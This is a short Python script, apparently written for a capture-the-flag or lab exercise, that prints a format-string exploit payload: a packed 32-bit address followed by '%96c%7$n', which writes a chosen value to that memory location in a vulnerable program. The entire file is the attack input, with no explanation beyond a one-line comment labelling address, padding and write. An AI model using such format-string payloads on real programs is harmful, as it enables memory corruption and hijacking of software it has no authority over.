#! /usr/bin/python

import sys

#                   Address        pad write
sys.stdout.write(b'\x2C\xA0\x04\x08%96c%7$n\n')
